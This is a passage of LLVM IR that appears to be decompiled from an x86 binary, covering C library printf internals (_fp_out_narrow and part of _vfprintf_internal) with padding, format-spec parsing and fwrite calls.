  %v0_804e1bc = phi i32 [ %v0_804e1bc.pre, %dec_label_pc_804e1b2.dec_label_pc_804e1b7_crit_edge ], [ %v0_804e1a3, %dec_label_pc_804e1b7.lr.ph ]
  %v0_804e1bb = phi i32 [ %v0_804e1bb.pre, %dec_label_pc_804e1b2.dec_label_pc_804e1b7_crit_edge ], [ %v0_804e1ac, %dec_label_pc_804e1b7.lr.ph ]
  %v4_804e1c0 = call i32 @__stdio_fwrite(i32 %v2_804e1b7, i32 1, i32 %v0_804e1bc, i32 %v0_804e1bb)
  %v8_804e1c8 = icmp eq i32 %v4_804e1c0, 1
  %v0_804e1b2 = load i32, i32* @ebx, align 4
  br i1 %v8_804e1c8, label %dec_label_pc_804e1b2, label %dec_label_pc_804e1cb.loopexit

dec_label_pc_804e1cb.loopexit:                    ; preds = %dec_label_pc_804e1b2, %dec_label_pc_804e1b7
  %v1_804e1cb.ph = phi i32 [ %v0_804e1b2, %dec_label_pc_804e1b7 ], [ 0, %dec_label_pc_804e1b2 ]
  %v0_804e1cb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e1cb

dec_label_pc_804e1cb:                             ; preds = %dec_label_pc_804e1cb.loopexit, %entry
  %v0_804e1cb = phi i32 [ 0, %entry ], [ %v0_804e1cb.pre, %dec_label_pc_804e1cb.loopexit ]
  %v1_804e1cb = phi i32 [ 0, %entry ], [ %v1_804e1cb.ph, %dec_label_pc_804e1cb.loopexit ]
  %v2_804e1cb = sub i32 %v0_804e1cb, %v1_804e1cb
  store i32 %v0_804e1a2, i32* @ebx, align 4
  store i32 %v0_804e1a1, i32* @esi, align 4
  store i32 %v0_804e1a0, i32* @edi, align 4
  ret i32 %v2_804e1cb

; uselistorder directives
  uselistorder i32 %v1_804e1b2, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804e1cb.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804e1e9 = trunc i32 %arg2 to i8
  %v5_804e1e9 = icmp slt i8 %v3_804e1e9, 0
  %v1_804e1eb = icmp eq i1 %v5_804e1e9, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_804e1eb, label %dec_label_pc_804e21c, label %dec_label_pc_804e1ed

dec_label_pc_804e1ed:                             ; preds = %entry
  %v3_804e1f4 = call i32 @strlen(i8* %arg4)
  %v0_804e1fc = load i32, i32* @ebx, align 4
  %v2_804e1fc = sub i32 %v0_804e1fc, %v3_804e1f4
  store i32 %v2_804e1fc, i32* @ebx, align 4
  store i32 %v3_804e1f4, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_804e1fc, 1
  br i1 %tmp23, label %dec_label_pc_804e21a, label %dec_label_pc_804e204

dec_label_pc_804e204:                             ; preds = %dec_label_pc_804e1ed
  %v0_804e204 = load i32, i32* @edi, align 4
  %v1_804e204 = urem i32 %v0_804e204, 128
  store i32 %v1_804e204, i32* @edi, align 4
  store i32 %v2_804e1fc, i32* @ecx, align 4
  store i32 %v1_804e204, i32* @edx, align 4
  store i32 %arg1, i32* @eax, align 4
  %v0_804e20f = call i32 @_charpad()
  store i32 %v0_804e20f, i32* @ebp, align 4
  %v12_804e216 = icmp eq i32 %v0_804e20f, %v2_804e1fc
  %v1_804e218 = icmp eq i1 %v12_804e216, false
  br i1 %v1_804e218, label %dec_label_pc_804e236, label %dec_label_pc_804e204.dec_label_pc_804e21a_crit_edge

dec_label_pc_804e204.dec_label_pc_804e21a_crit_edge: ; preds = %dec_label_pc_804e204
  %v0_804e21a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e21a

dec_label_pc_804e21a:                             ; preds = %dec_label_pc_804e204.dec_label_pc_804e21a_crit_edge, %dec_label_pc_804e1ed
  %v0_804e21a = phi i32 [ %v0_804e21a.pre, %dec_label_pc_804e204.dec_label_pc_804e21a_crit_edge ], [ %v3_804e1f4, %dec_label_pc_804e1ed ]
  store i32 %v0_804e21a, i32* @ebx, align 4
  br label %dec_label_pc_804e21c

dec_label_pc_804e21c:                             ; preds = %entry, %dec_label_pc_804e21a
  %v0_804e227 = phi i32 [ %arg3, %entry ], [ %v0_804e21a, %dec_label_pc_804e21a ]
  %tmp24 = icmp slt i32 %v0_804e227, 1
  br i1 %tmp24, label %dec_label_pc_804e234, label %dec_label_pc_804e222

dec_label_pc_804e222:                             ; preds = %dec_label_pc_804e21c
  %v0_804e222 = load i32, i32* @ecx, align 4
  %v5_804e22c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_804e227, i32 %arg1, i32 %v0_804e222)
  br label %dec_label_pc_804e234

dec_label_pc_804e234:                             ; preds = %dec_label_pc_804e21c, %dec_label_pc_804e222
  %v1_804e234 = phi i32 [ 0, %dec_label_pc_804e21c ], [ %v5_804e22c, %dec_label_pc_804e222 ]
  %v0_804e234 = load i32, i32* @ebp, align 4
  %v2_804e234 = add i32 %v0_804e234, %v1_804e234
  br label %dec_label_pc_804e236

dec_label_pc_804e236:                             ; preds = %dec_label_pc_804e204, %dec_label_pc_804e234
  %v0_804e239 = phi i32 [ %v0_804e20f, %dec_label_pc_804e204 ], [ %v2_804e234, %dec_label_pc_804e234 ]
  ret i32 %v0_804e239

; uselistorder directives
  uselistorder i32 %v0_804e227, { 1, 0 }
  uselistorder i32 %v0_804e20f, { 1, 0, 2 }
  uselistorder i32 %v1_804e204, { 1, 0 }
  uselistorder i32 %v2_804e1fc, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804e236, { 1, 0 }
  uselistorder label %dec_label_pc_804e234, { 1, 0 }
  uselistorder label %dec_label_pc_804e21c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804e24a = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e24a, i32* @ebx, align 4
  %v2_804e252 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804e252, i32* @esi, align 4
  %v5_804e257 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804e24a)
  store i32 %v5_804e257, i32* %eax.global-to-local, align 4
  %v2_804e25f = icmp slt i32 %v5_804e257, 0
  %v1_804e261 = icmp eq i1 %v2_804e25f, false
  br i1 %v1_804e261, label %dec_label_pc_804e2a1, label %dec_label_pc_804e263

dec_label_pc_804e263:                             ; preds = %entry
  %v3_804e263 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804e263, i32* @ebx, align 4
  %v5_804e26a = inttoptr i32 %v3_804e263 to i8*
  %v3_804e26b = call i32 @strlen(i8* %v5_804e26a)
  store i32 %v3_804e26b, i32* %eax.global-to-local, align 4
  %v1_804e273 = icmp eq i32 %v3_804e26b, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804e273, label %dec_label_pc_804e7da, label %dec_label_pc_804e282

dec_label_pc_804e282:                             ; preds = %dec_label_pc_804e263
  %v0_804e282 = load i32, i32* @edx, align 4
  %v0_804e28b = load i32, i32* @ebx, align 4
  %v6_804e28c = call i32 @__stdio_fwrite(i32 %v0_804e28b, i32 %v3_804e26b, i32 %arg1, i32 %v0_804e282)
  store i32 %v6_804e28c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804e7da

dec_label_pc_804e2a1:                             ; preds = %entry
  %v6_804e2ab = call i32 @_ppfs_prepargs(i32 %v2_804e252, i32 %arg3, i32 %v5_804e257, i32 %v5_804e257)
  store i32 %v6_804e2ab, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804e2b8 = load i32, i32* @ebx, align 4
  store i32 %v0_804e2b8, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e2c0

dec_label_pc_804e2bf:                             ; preds = %dec_label_pc_804e2c6
  %v1_804e2bf = add i32 %v0_804e2ce, 1
  store i32 %v1_804e2bf, i32* @ebx, align 4
  br label %dec_label_pc_804e2c0.backedge

dec_label_pc_804e2c0.backedge:                    ; preds = %dec_label_pc_804e2bf, %dec_label_pc_804e7c0, %dec_label_pc_804e7cb
  %v1_804e2ca19 = phi i32 [ %v1_804e2d2, %dec_label_pc_804e2bf ], [ %v3_804e7c0, %dec_label_pc_804e7c0 ], [ %v1_804e2fe, %dec_label_pc_804e7cb ]
  %v0_804e2c017 = phi i32 [ %v1_804e2bf, %dec_label_pc_804e2bf ], [ %v3_804e7c0, %dec_label_pc_804e7c0 ], [ %v1_804e7cb, %dec_label_pc_804e7cb ]
  %v4_804e2c0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2c0

dec_label_pc_804e2c0:                             ; preds = %dec_label_pc_804e2c0.backedge, %dec_label_pc_804e2a1
  %v1_804e2d2 = phi i32 [ %v1_804e2ca19, %dec_label_pc_804e2c0.backedge ], [ %v0_804e2b8, %dec_label_pc_804e2a1 ]
  %v0_804e2ce = phi i32 [ %v0_804e2c017, %dec_label_pc_804e2c0.backedge ], [ %v0_804e2b8, %dec_label_pc_804e2a1 ]
  %v4_804e2c0 = phi i32 [ %v4_804e2c0.pre, %dec_label_pc_804e2c0.backedge ], [ %v6_804e2ab, %dec_label_pc_804e2a1 ]
  %v1_804e2c0 = inttoptr i32 %v0_804e2ce to i8*
  %v2_804e2c0 = load i8, i8* %v1_804e2c0, align 1
  %v3_804e2c0 = zext i8 %v2_804e2c0 to i32
  %v5_804e2c0 = and i32 %v4_804e2c0, -256
  %v6_804e2c0 = or i32 %v3_804e2c0, %v5_804e2c0
  store i32 %v6_804e2c0, i32* %eax.global-to-local, align 4
  %v4_804e2c2 = icmp eq i8 %v2_804e2c0, 0
  br i1 %v4_804e2c2, label %dec_label_pc_804e2ca, label %dec_label_pc_804e2c6

dec_label_pc_804e2c6:                             ; preds = %dec_label_pc_804e2c0
  %v10_804e2c6 = icmp eq i8 %v2_804e2c0, 37
  %v1_804e2c8 = icmp eq i1 %v10_804e2c6, false
  br i1 %v1_804e2c8, label %dec_label_pc_804e2bf, label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2c6, %dec_label_pc_804e2c0
  %v2_804e2ca = sub i32 %v0_804e2ce, %v1_804e2d2
  %v12_804e2ca = icmp eq i32 %v2_804e2ca, 0
  br i1 %v12_804e2ca, label %dec_label_pc_804e2f5, label %dec_label_pc_804e2ce

dec_label_pc_804e2ce:                             ; preds = %dec_label_pc_804e2ca
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804e2ca, i32* @esi, align 4
  %tmp66 = icmp slt i32 %v2_804e2ca, 1
  br i1 %tmp66, label %dec_label_pc_804e2ea, label %dec_label_pc_804e2d8

dec_label_pc_804e2d8:                             ; preds = %dec_label_pc_804e2ce
  %v0_804e2d8 = load i32, i32* @ebp, align 4
  %v1_804e2d8 = load i32, i32* @esp, align 4
  %v2_804e2d8 = add i32 %v1_804e2d8, -4
  %v3_804e2d8 = inttoptr i32 %v2_804e2d8 to i32*
  store i32 %v0_804e2d8, i32* %v3_804e2d8, align 4
  %v1_804e2d9 = add i32 %v1_804e2d8, 368
  %v2_804e2d9 = inttoptr i32 %v1_804e2d9 to i32*
  %v3_804e2d9 = load i32, i32* %v2_804e2d9, align 4
  %v5_804e2d9 = add i32 %v1_804e2d8, -8
  %v6_804e2d9 = inttoptr i32 %v5_804e2d9 to i32*
  store i32 %v3_804e2d9, i32* %v6_804e2d9, align 4
  %v0_804e2e0 = load i32, i32* @esi, align 4
  %v2_804e2e0 = add i32 %v1_804e2d8, -12
  %v3_804e2e0 = inttoptr i32 %v2_804e2e0 to i32*
  store i32 %v0_804e2e0, i32* %v3_804e2e0, align 4
  %v0_804e2e1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e2e1 = add i32 %v1_804e2d8, -16
  %v3_804e2e1 = inttoptr i32 %v2_804e2e1 to i32*
  store i32 %v0_804e2e1, i32* %v3_804e2e1, align 4
  %v0_804e2e2 = load i32, i32* %stack_var_-364, align 4
  %v4_804e2e2 = call i32 @__stdio_fwrite(i32 %v0_804e2e2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e2e2, i32* %eax.global-to-local, align 4
  %v1_804e2ea.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e2ea

dec_label_pc_804e2ea:                             ; preds = %dec_label_pc_804e2ce, %dec_label_pc_804e2d8
  %v3_804e2f2 = phi i32 [ %v2_804e2ca, %dec_label_pc_804e2ce ], [ %v1_804e2ea.pre, %dec_label_pc_804e2d8 ]
  %v0_804e2ea = phi i32 [ 0, %dec_label_pc_804e2ce ], [ %v4_804e2e2, %dec_label_pc_804e2d8 ]
  %v12_804e2ea = icmp eq i32 %v0_804e2ea, %v3_804e2f2
  %v1_804e2ec = icmp eq i1 %v12_804e2ea, false
  %v0_804e7d3.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804e2ec, label %dec_label_pc_804e7d3, label %dec_label_pc_804e2f2

dec_label_pc_804e2f2:                             ; preds = %dec_label_pc_804e2ea
  %v1_804e2f2 = inttoptr i32 %v0_804e7d3.pre.pre to i32*
  %v2_804e2f2 = load i32, i32* %v1_804e2f2, align 4
  %v4_804e2f2 = add i32 %v2_804e2f2, %v3_804e2f2
  store i32 %v4_804e2f2, i32* %v1_804e2f2, align 4
  %v0_804e2f5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e2f5

dec_label_pc_804e2f5:                             ; preds = %dec_label_pc_804e2ca, %dec_label_pc_804e2f2
  %v0_804e7cb = phi i32 [ %v0_804e2ce, %dec_label_pc_804e2ca ], [ %v0_804e2f5.pre, %dec_label_pc_804e2f2 ]
  %v1_804e2f5 = inttoptr i32 %v0_804e7cb to i8*
  %v2_804e2f5 = load i8, i8* %v1_804e2f5, align 1
  %v3_804e2f5 = icmp eq i8 %v2_804e2f5, 0
  br i1 %v3_804e2f5, label %dec_label_pc_804e7da, label %dec_label_pc_804e2fe

dec_label_pc_804e2fe:                             ; preds = %dec_label_pc_804e2f5
  %v1_804e2fe = add i32 %v0_804e7cb, 1
  store i32 %v1_804e2fe, i32* %edx.global-to-local, align 4
  %v2_804e301 = inttoptr i32 %v1_804e2fe to i8*
  %v3_804e301 = load i8, i8* %v2_804e301, align 1
  %v12_804e301 = icmp eq i8 %v3_804e301, 37
  br i1 %v12_804e301, label %dec_label_pc_804e7cb, label %dec_label_pc_804e30b

dec_label_pc_804e30b:                             ; preds = %dec_label_pc_804e2fe
  %v1_804e30b = load i32, i32* @esp, align 4
  %v2_804e30b = add i32 %v1_804e30b, 16
  %v3_804e30b = inttoptr i32 %v2_804e30b to i32*
  store i32 %v1_804e2fe, i32* %v3_804e30b, align 4
  %v0_804e30f = load i32, i32* @esp, align 4
  %v1_804e30f = add i32 %v0_804e30f, 340
  %v2_804e30f = inttoptr i32 %v1_804e30f to i32*
  store i32 0, i32* %v2_804e30f, align 4
  %v0_804e31a = load i32, i32* @esp, align 4
  %v1_804e31d = add i32 %v0_804e31a, 16
  store i32 %v1_804e31d, i32* @ebx, align 4
  %v2_804e321 = add i32 %v0_804e31a, -16
  %v3_804e321 = inttoptr i32 %v2_804e321 to i32*
  store i32 %v1_804e31d, i32* %v3_804e321, align 4
  %v0_804e322 = load i32, i32* %stack_var_-364, align 4
  %v1_804e322 = inttoptr i32 %v0_804e322 to i32*
  %v2_804e322 = call i32 @_ppfs_parsespec(i32* %v1_804e322)
  store i32 %v2_804e322, i32* %eax.global-to-local, align 4
  %v0_804e327 = load i32, i32* @ebx, align 4
  %v1_804e327 = load i32, i32* @esp, align 4
  %v2_804e327 = inttoptr i32 %v1_804e327 to i32*
  store i32 %v0_804e327, i32* %v2_804e327, align 4
  %v0_804e32a = load i32, i32* %stack_var_-364, align 4
  %v1_804e32a = call i32 @_ppfs_setargs(i32 %v0_804e32a)
  store i32 %v1_804e32a, i32* %eax.global-to-local, align 4
  %v0_804e32f = load i32, i32* @esp, align 4
  %v1_804e32f = add i32 %v0_804e32f, 70
  %v2_804e32f = inttoptr i32 %v1_804e32f to i8*
  %v3_804e32f = load i8, i8* %v2_804e32f, align 1
  %v4_804e32f = zext i8 %v3_804e32f to i32
  store i32 %v4_804e32f, i32* @edi, align 4
  %v1_804e334 = add i32 %v0_804e32f, 16
  %v1_804e337 = add i32 %v0_804e32f, 56
  %v2_804e337 = inttoptr i32 %v1_804e337 to i32*
  %v3_804e337 = load i32, i32* %v2_804e337, align 4
  %v1_804e33c = add i32 %v0_804e32f, 112
  store i32 %v1_804e33c, i32* %edx.global-to-local, align 4
  %tmp67 = icmp slt i32 %v3_804e337, 1
  br i1 %tmp67, label %dec_label_pc_804e349, label %dec_label_pc_804e342

dec_label_pc_804e342:                             ; preds = %dec_label_pc_804e30b
  %v2_804e342 = zext i8 %v3_804e32f to i32
  %v3_804e342 = mul nuw nsw i32 %v2_804e342, 12
  store i32 %v3_804e342, i32* %eax.global-to-local, align 4
  %v2_804e345 = add i32 %v0_804e32f, 100
  %v3_804e345 = add i32 %v2_804e345, %v3_804e342
  store i32 %v3_804e345, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e349

dec_label_pc_804e349:                             ; preds = %dec_label_pc_804e30b, %dec_label_pc_804e342
  %v0_804e35127 = phi i32 [ %v1_804e33c, %dec_label_pc_804e30b ], [ %v3_804e345, %dec_label_pc_804e342 ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e34b = add i32 %v0_804e32f, 60
  %v2_804e34b = inttoptr i32 %v1_804e34b to i32*
  %v3_804e34b = load i32, i32* %v2_804e34b, align 4
  store i32 %v3_804e34b, i32* %ecx.global-to-local, align 4
  %v2_804e35c80 = sub i32 0, %v3_804e34b
  %v10_804e35c83 = and i32 %v3_804e34b, %v2_804e35c80
  %v11_804e35c84 = icmp slt i32 %v10_804e35c83, 0
  %v13_804e35c85 = icmp slt i32 %v2_804e35c80, 0
  %v2_804e35e86 = icmp eq i1 %v13_804e35c85, %v11_804e35c84
  br i1 %v2_804e35e86, label %dec_label_pc_804e360, label %dec_label_pc_804e351

dec_label_pc_804e351:                             ; preds = %dec_label_pc_804e349, %dec_label_pc_804e351
  %v0_804e36090 = phi i32 [ %v0_804e360, %dec_label_pc_804e351 ], [ %v1_804e334, %dec_label_pc_804e349 ]
  %v2_804e35189 = phi i32 [ %v1_804e35b, %dec_label_pc_804e351 ], [ 0, %dec_label_pc_804e349 ]
  %v0_804e35188 = phi i32 [ %v1_804e358, %dec_label_pc_804e351 ], [ %v0_804e35127, %dec_label_pc_804e349 ]
  %v3_804e351 = mul i32 %v2_804e35189, 4
  %v4_804e351 = add i32 %v0_804e36090, 344
  %v5_804e351 = add i32 %v4_804e351, %v3_804e351
  %v6_804e351 = inttoptr i32 %v5_804e351 to i32*
  store i32 %v0_804e35188, i32* %v6_804e351, align 4
  %v0_804e358 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e358 = add i32 %v0_804e358, 12
  store i32 %v1_804e358, i32* %edx.global-to-local, align 4
  %v0_804e35b = load i32, i32* %eax.global-to-local, align 4
  %v1_804e35b = add i32 %v0_804e35b, 1
  store i32 %v1_804e35b, i32* %eax.global-to-local, align 4
  %v1_804e35c.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e35c = sub i32 %v1_804e35b, %v1_804e35c.pre
  %v8_804e35c = xor i32 %v1_804e35b, %v1_804e35c.pre
  %v9_804e35c = xor i32 %v2_804e35c, %v1_804e35b
  %v10_804e35c = and i32 %v9_804e35c, %v8_804e35c
  %v11_804e35c = icmp slt i32 %v10_804e35c, 0
  %v13_804e35c = icmp slt i32 %v2_804e35c, 0
  %v2_804e35e = icmp eq i1 %v13_804e35c, %v11_804e35c
  %v0_804e360 = load i32, i32* @esp, align 4
  br i1 %v2_804e35e, label %dec_label_pc_804e360, label %dec_label_pc_804e351

dec_label_pc_804e360:                             ; preds = %dec_label_pc_804e351, %dec_label_pc_804e349
  %v0_804e360.lcssa = phi i32 [ %v1_804e334, %dec_label_pc_804e349 ], [ %v0_804e360, %dec_label_pc_804e351 ]
  %v1_804e360 = add i32 %v0_804e360.lcssa, 48
  %v2_804e360 = inttoptr i32 %v1_804e360 to i32*
  %v3_804e360 = load i32, i32* %v2_804e360, align 4
  store i32 %v3_804e360, i32* @ecx, align 4
  %v1_804e364 = icmp eq i32 %v3_804e360, 0
  %v1_804e366 = icmp eq i1 %v1_804e364, false
  br i1 %v1_804e366, label %dec_label_pc_804e38e, label %dec_label_pc_804e368

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e360
  %v1_804e368 = inttoptr i32 %v0_804e360.lcssa to i32*
  %v2_804e368 = load i32, i32* %v1_804e368, align 4
  store i32 %v2_804e368, i32* %eax.global-to-local, align 4
  %v1_804e36b = ashr i32 %v2_804e368, 31
  store i32 %v1_804e36b, i32* %edx.global-to-local, align 4
  %v2_804e36c = add i32 %v0_804e360.lcssa, -4
  %v3_804e36c = inttoptr i32 %v2_804e36c to i32*
  store i32 %v1_804e36b, i32* %v3_804e36c, align 4
  %v0_804e36d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e36d = add i32 %v0_804e360.lcssa, -8
  %v3_804e36d = inttoptr i32 %v2_804e36d to i32*
  store i32 %v0_804e36d, i32* %v3_804e36d, align 4
  %v1_804e36e = add i32 %v0_804e360.lcssa, 32
  %v2_804e36e = inttoptr i32 %v1_804e36e to i32*
  %v3_804e36e = load i32, i32* %v2_804e36e, align 4
  %v1_804e372 = and i32 %v3_804e36e, 3840
  store i32 %v1_804e372, i32* %eax.global-to-local, align 4
  %v2_804e377 = add i32 %v0_804e360.lcssa, -12
  %v3_804e377 = inttoptr i32 %v2_804e377 to i32*
  store i32 %v1_804e372, i32* %v3_804e377, align 4
  %v1_804e378 = add i32 %v0_804e360.lcssa, 344
  %v2_804e378 = inttoptr i32 %v1_804e378 to i32*
  %v3_804e378 = load i32, i32* %v2_804e378, align 4
  store i32 %v3_804e378, i32* %eax.global-to-local, align 4
  %v1_804e37f = inttoptr i32 %v3_804e378 to i32*
  %v2_804e37f = load i32, i32* %v1_804e37f, align 4
  %v4_804e37f = add i32 %v0_804e360.lcssa, -16
  %v5_804e37f = inttoptr i32 %v4_804e37f to i32*
  store i32 %v2_804e37f, i32* %v5_804e37f, align 4
  %v0_804e381 = call i32 @_store_inttype()
  store i32 %v0_804e381, i32* %eax.global-to-local, align 4
  %v0_804e386 = load i32, i32* @esp, align 4
  %v1_804e386 = add i32 %v0_804e386, 16
  br label %dec_label_pc_804e7c0

dec_label_pc_804e38e:                             ; preds = %dec_label_pc_804e360
  %tmp93 = icmp ult i32 %v3_804e360, 8
  br i1 %tmp93, label %dec_label_pc_804e397, label %dec_label_pc_804e4f8

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e38e
  %v1_804e397 = add i32 %v3_804e360, 134573520
  %v2_804e397 = inttoptr i32 %v1_804e397 to i8*
  %v3_804e397 = load i8, i8* %v2_804e397, align 1
  %v4_804e397 = sext i8 %v3_804e397 to i32
  store i32 %v4_804e397, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e3a3 = icmp eq i8 %v3_804e397, 10
  %v1_804e3a6 = icmp eq i1 %v9_804e3a3, false
  br i1 %v1_804e3a6, label %dec_label_pc_804e3c4, label %dec_label_pc_804e3a8

dec_label_pc_804e3a8:                             ; preds = %dec_label_pc_804e397
  %v1_804e3a8 = add i32 %v0_804e360.lcssa, 32
  %v2_804e3a8 = inttoptr i32 %v1_804e3a8 to i32*
  %v3_804e3a8 = load i32, i32* %v2_804e3a8, align 4
  %v1_804e3ae = and i32 %v3_804e3a8, 32
  store i32 %v1_804e3ae, i32* %eax.global-to-local, align 4
  %tmp68 = udiv i32 %v1_804e3ae, 32
  %tmp69 = sub nsw i32 45, %tmp68
  store i32 %tmp69, i32* @ebx, align 4
  %v1_804e3bc = trunc i32 %v3_804e3a8 to i8
  %v2_804e3bc = and i8 %v1_804e3bc, 64
  %v3_804e3bc = icmp eq i8 %v2_804e3bc, 0
  %v5_804e3bc = zext i8 %v2_804e3bc to i32
  %v7_804e3bc = and i32 %v3_804e3a8, -256
  %v8_804e3bc = or i32 %v5_804e3bc, %v7_804e3bc
  store i32 %v8_804e3bc, i32* %edx.global-to-local, align 4
  br i1 %v3_804e3bc, label %dec_label_pc_804e3c4, label %dec_label_pc_804e3c1

dec_label_pc_804e3c1:                             ; preds = %dec_label_pc_804e3a8
  %v2_804e3c1 = or i32 %tmp69, 128
  store i32 %v2_804e3c1, i32* @ebx, align 4
  br label %dec_label_pc_804e3c4

dec_label_pc_804e3c4:                             ; preds = %dec_label_pc_804e3a8, %dec_label_pc_804e397, %dec_label_pc_804e3c1
  %tmp94 = icmp ult i32 %v3_804e360, 6
  br i1 %tmp94, label %dec_label_pc_804e3c9, label %dec_label_pc_804e3e1

dec_label_pc_804e3c9:                             ; preds = %dec_label_pc_804e3c4
  %v9_804e3c9 = icmp eq i32 %v3_804e360, 3
  %v1_804e3cc = icmp eq i1 %v9_804e3c9, false
  br i1 %v1_804e3cc, label %dec_label_pc_804e3d5, label %dec_label_pc_804e3ce

dec_label_pc_804e3ce:                             ; preds = %dec_label_pc_804e3c9
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e3e3

dec_label_pc_804e3d5:                             ; preds = %dec_label_pc_804e3c9
  %v9_804e3da = icmp eq i32 %v3_804e360, 1
  br i1 %v9_804e3da, label %dec_label_pc_804e3e8, label %dec_label_pc_804e3e3

dec_label_pc_804e3e1:                             ; preds = %dec_label_pc_804e3c4
  %v1_804e3e1 = sub nsw i32 0, %v4_804e397
  store i32 %v1_804e3e1, i32* @esi, align 4
  br label %dec_label_pc_804e3e3

dec_label_pc_804e3e3:                             ; preds = %dec_label_pc_804e3d5, %dec_label_pc_804e3ce, %dec_label_pc_804e3e1
  br label %dec_label_pc_804e3e8

dec_label_pc_804e3e8:                             ; preds = %dec_label_pc_804e3d5, %dec_label_pc_804e3e3
  %storemerge105 = phi i32 [ 11, %dec_label_pc_804e3e3 ], [ 6, %dec_label_pc_804e3d5 ]
  store i32 %storemerge105, i32* @ebp, align 4
  %v1_804e3e8 = add i32 %v0_804e360.lcssa, 7
  %v2_804e3e8 = inttoptr i32 %v1_804e3e8 to i8*
  store i8 32, i8* %v2_804e3e8, align 1
  %v0_804e3ed = load i32, i32* @esp, align 4
  %v1_804e3ed = add i32 %v0_804e3ed, 20
  %v2_804e3ed = inttoptr i32 %v1_804e3ed to i32*
  %v3_804e3ed = load i32, i32* %v2_804e3ed, align 4
  %v5_804e3ed = icmp slt i32 %v3_804e3ed, 0
  %v1_804e3f2 = icmp eq i1 %v5_804e3ed, false
  br i1 %v1_804e3f2, label %dec_label_pc_804e3fc, label %dec_label_pc_804e3f4

dec_label_pc_804e3f4:                             ; preds = %dec_label_pc_804e3e8
  %v1_804e3f4 = add i32 %v0_804e3ed, 36
  %v2_804e3f4 = inttoptr i32 %v1_804e3f4 to i8*
  %v3_804e3f4 = load i8, i8* %v2_804e3f4, align 1
  %v4_804e3f4 = zext i8 %v3_804e3f4 to i32
  %v5_804e3f4 = load i32, i32* %edx.global-to-local, align 4
  %v6_804e3f4 = and i32 %v5_804e3f4, -256
  %v7_804e3f4 = or i32 %v6_804e3f4, %v4_804e3f4
  store i32 %v7_804e3f4, i32* %edx.global-to-local, align 4
  %v3_804e3f8 = add i32 %v0_804e3ed, 7
  %v4_804e3f8 = inttoptr i32 %v3_804e3f8 to i8*
  store i8 %v3_804e3f4, i8* %v4_804e3f8, align 1
  %v0_804e3fc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e3fc

dec_label_pc_804e3fc:                             ; preds = %dec_label_pc_804e3e8, %dec_label_pc_804e3f4
  %v1_804e415 = phi i32 [ %v0_804e3ed, %dec_label_pc_804e3e8 ], [ %v0_804e3fc.pre, %dec_label_pc_804e3f4 ]
  %v1_804e3fc = add i32 %v1_804e415, 344
  %v2_804e3fc = inttoptr i32 %v1_804e3fc to i32*
  %v3_804e3fc = load i32, i32* %v2_804e3fc, align 4
  store i32 %v3_804e3fc, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804e408 = add i32 %v3_804e360, -1
  %v8_804e408 = icmp eq i32 %v1_804e408, 0
  store i32 %v1_804e408, i32* %ecx.global-to-local, align 4
  %v0_804e415.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e408, label %dec_label_pc_804e415, label %dec_label_pc_804e40b

dec_label_pc_804e40b:                             ; preds = %dec_label_pc_804e3fc
  %v2_804e40b = mul i32 %v0_804e415.pre, 4
  %v3_804e40b = add i32 %v1_804e415, 52
  %v4_804e40b = add i32 %v3_804e40b, %v2_804e40b
  %v5_804e40b = inttoptr i32 %v4_804e40b to i32*
  %v6_804e40b = load i32, i32* %v5_804e40b, align 4
  %v1_804e40f = and i32 %v6_804e40b, 3840
  store i32 %v1_804e40f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e415

